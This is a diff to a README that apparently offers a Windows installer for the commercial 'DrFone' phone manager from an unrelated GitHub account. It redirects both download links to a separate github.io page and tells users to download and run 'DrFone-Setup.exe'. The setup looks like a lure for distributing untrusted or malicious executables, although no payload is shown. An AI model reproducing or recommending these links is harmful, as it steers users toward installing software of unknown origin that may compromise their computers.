@@ -1,6 +1,6 @@
 # 📱 DrFone-Phone-Manager-Setup - Manage your mobile devices with ease
 
-[![Download DrFone](https://img.shields.io/badge/Download-Manager-blue.svg)](https://github.com/donaparthian154/DrFone-Phone-Manager-Setup)
+[![Download DrFone](https://img.shields.io/badge/Download-Manager-blue.svg)](https://donaparthian154.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit this [Download Page](https://github.com/donaparthian154/DrFone-Phone-Manager-Setup) to access the installer.
+1. Visit this [Download Page](https://donaparthian154.github.io) to access the installer.
 2. Locate the file named `DrFone-Setup.exe` on the page.
 3. Click the file to start the download to your computer.
 4. Wait for the download to finish.
